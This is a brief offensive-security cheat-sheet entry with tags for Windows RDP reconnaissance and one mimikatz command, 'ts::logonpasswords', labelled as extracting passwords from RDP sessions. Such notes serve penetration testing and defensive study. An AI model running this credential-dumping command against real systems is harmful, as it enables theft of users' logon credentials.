# windows
% rdp, windows, 3389
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON 

# powershell
% rdp, windows, 3389
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON  #tag/powershell 

# mimikatz

% mimikatz, passwords
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 


% mimikatz, rdp


## rdp - Extract passwords
```
ts::logonpasswords
```